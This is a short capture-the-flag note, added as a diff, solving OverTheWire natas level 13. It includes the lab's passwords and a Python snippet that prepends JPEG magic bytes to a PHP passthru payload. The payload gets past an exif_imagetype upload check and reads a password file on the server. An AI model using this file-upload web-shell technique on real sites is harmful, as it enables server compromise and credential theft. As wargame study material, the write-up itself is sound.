@@ -1,0 +1,15 @@
+URL: http://natas13.natas.labs.overthewire.org
+user: natas13
+password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+Same as natas13, just checks if it's an image using exif_imagetype
+exif_imagetype check the first bytes of the file to see if matches signature.
+
+Create the payload in python:
+> fh = open('payload13.php','w')
+> fh.write('\xFF\xD8\xFF\xE0' + '<? passthru("cat /etc/natas_webpass/natas14") ?>')
+> fh.close()
+
+change the hidden value to something.php
+
+natas14 pass: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
